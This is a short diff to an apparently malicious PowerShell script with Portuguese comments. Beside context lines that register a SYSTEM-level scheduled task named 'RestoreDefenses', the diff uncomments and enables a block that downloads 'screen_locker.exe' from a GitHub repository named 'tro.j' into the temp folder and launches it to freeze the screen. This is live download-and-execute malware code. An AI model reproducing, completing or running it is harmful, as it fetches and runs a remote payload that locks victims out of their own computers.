@@ -18,7 +18,7 @@ $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccou
 Register-ScheduledTask -TaskName "RestoreDefenses" -Action $action -Trigger $trigger -Principal $principal -Force | Out-Null
 
 # ---------- Baixar e executar o screen locker ----------
-//$lockerUrl = "https://raw.githubusercontent.com/gsfv/tro.j/refs/heads/main/screen_locker.exe"
-//$lockerPath = "$env:TEMP\screen_locker.exe"
-//(New-Object Net.WebClient).DownloadFile($lockerUrl, $lockerPath)
-//Start-Process $lockerPath   # congela a tela
+$lockerUrl = "https://raw.githubusercontent.com/gsfv/tro.j/refs/heads/main/screen_locker.exe"
+$lockerPath = "$env:TEMP\screen_locker.exe"
+(New-Object Net.WebClient).DownloadFile($lockerUrl, $lockerPath)
+Start-Process $lockerPath   # congela a tela
